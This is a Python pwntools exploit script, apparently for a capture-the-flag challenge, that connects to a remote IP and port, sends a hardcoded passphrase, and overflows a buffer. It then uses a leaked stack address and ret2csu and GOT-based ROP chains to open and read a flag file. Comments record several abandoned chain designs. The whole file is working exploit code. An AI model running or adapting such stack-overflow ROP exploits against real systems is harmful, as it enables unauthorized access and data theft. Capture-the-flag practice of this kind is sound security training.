#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
ret_gadget = 0x401016
csu_pop = 0x401512
csu_call = 0x4014f8

got_open = 0x403278
got_read = 0x403250

path = b'/challenge/flag.txt\x00'
pad = b'A' * 64 + b'B' * 8

# Use CSU to call open via GOT (call pushes ret addr properly)
# rdi = path, rsi = 0, rdx = 0 (mode ignored for O_RDONLY)
# After open, CSU pops back → then puts(0x402041) + main
rop = p64(csu_pop)
rop += p64(0)              # rbx = 0
rop += p64(1)              # rbp = 1
rop += p64(0xdeadbeef)     # r12 = edi (path addr) - placeholder
rop += p64(0)              # r13 = rsi (0 = O_RDONLY)  
rop += p64(0)              # r14 = rdx (0 = mode, ignored)
rop += p64(got_open)       # r15 = &open@got
rop += p64(csu_call)       # call open via GOT
# After CSU exit (rbx=1==rbp → exit loop):
rop += p64(0)              # add rsp,8
rop += p64(0) * 6          # pop 6 regs
rop += p64(pop_rdi)
rop += p64(0x402041)       # "Spooktober!!!"
rop += p64(0x401040)       # puts@plt
rop += p64(0x401393)       # main

# But CSU only uses r12d (32-bit) for edi. So path addr must fit in 32 bits.
# Stack addresses on the remote start with 0x7ffe... which is > 32 bits.
# So we can't use CSU for pointing to the path directly!

# Alternative: use CSU for the string and pop_rdi for the path.
# Actually, let's just chain: open (via jmp) + ... but use CSU call for the SECOND part (read from fd)
# OR: use ROP to set rdi, then CSU to call open with rsi/rdx from CSU

# Actually, let me try yet another approach:
# put path at BUF start (known address = buf_leak), then pop_rdi → buf_leak, CSU for rsi/rdx
# Reset: pad, then pop_rdi → buf_leak, then CSU call open

pad2 = b'A' * 64 + b'B' * 8
rop2 = p64(pop_rdi)
rop2 += p64(buf_leak)      # path at buffer start
rop2 += p64(csu_pop)
rop2 += p64(0) + p64(1) + p64(0xdeadbeef) + p64(0) + p64(0) + p64(got_open)
# Wait, CSU call uses: mov rdx, r14; mov rsi, r13; mov edi, r12d
# But we want: rdi = buf_leak (already set by pop_rdi), rsi = 0, rdx = 0
# CSU will OVERWRITE edi with r12d!
# So we need r12d = buf_leak, but buf_leak is 64-bit stack addr > 32 bits

# Hmm. Pop_rdi sets rdi, then CSU call MOVES edi = r12d (overwrites rdi!)
# So we need r12d = low 32 bits of buf_leak. If buf_leak is 0x7ffe..., then
# r12d = 0x0001e... (lower 32 bits), which is not the full 64-bit address.

# This won't work for stack addresses. CSU's edi limitation means we can only
# use it for addresses that fit in 32 bits (like BSS or binary addresses).

# Let's just try: path at buffer start, buf_leak as path arg, pop_rdi sets it
# Then we need open without CSU. But open via jmp doesn't work...

# ACTUALLY, let me re-examine. Maybe the issue is specific to the remote libc.
# Let me try: read(0, bss, 32) to put "flag.txt" into BSS, then open(bss, 0)
# This avoids using stack addresses for the path.

rop3 = p64(csu_pop)
rop3 += p64(0) + p64(1) + p64(0) + p64(0x404100) + p64(32) + p64(got_read)
rop3 += p64(csu_call)
# After read: bss+0x100 has our path input
rop3 += p64(0) + p64(0)*6
# Now open(bss_path, 0)
rop3 += p64(pop_rdi)
rop3 += p64(0x404100)
rop3 += p64(pop_rsi_r15)
rop3 += p64(0) + p64(0)
rop3 += p64(0x4010e0)     # open@plt
# After open: puts("Spooktober") + main
rop3 += p64(pop_rdi)
rop3 += p64(0x402041)
rop3 += p64(0x401040)
rop3 += p64(0x401393)

payload3 = b'A' * 64 + b'B' * 8 + rop3
print(f'Payload: {len(payload3)}B')
r.send(payload3)

import time
time.sleep(0.3)
r.send(b'/challenge/flag.txt\x00')

try:
    data = r.recv(timeout=5)
    print(f'Data ({len(data)}B): {data[:500]}')
    if data.count(b'Spooktober') >= 2:
        print('SUCCESS!')
except Exception as e:
    print(f'Error: {e}')
r.close()
